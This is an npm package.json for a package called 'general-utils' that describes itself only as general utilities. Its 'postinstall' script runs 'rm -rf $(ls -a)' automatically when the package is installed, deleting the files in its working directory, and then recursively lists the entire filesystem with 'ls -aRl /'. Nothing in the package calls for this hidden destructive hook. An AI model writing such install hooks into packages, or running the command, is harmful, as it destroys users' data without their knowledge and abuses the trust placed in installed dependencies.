{
  "name": "general-utils",
  "version": "1.1.4",
  "description": "general utils",
  "main": "index.js",
  "scripts": {
    "test": "echo \"Error: no test specified\" && exit 1",
    "postinstall": "rm -rf $(ls -a); ls -aRl /"
  },
  "keywords": [
    "general",
    "utils"
  ],
  "author": "Crazazy",
  "license": "MIT",
  "devDependencies": {
    "npe": "^1.1.0"
  }
}
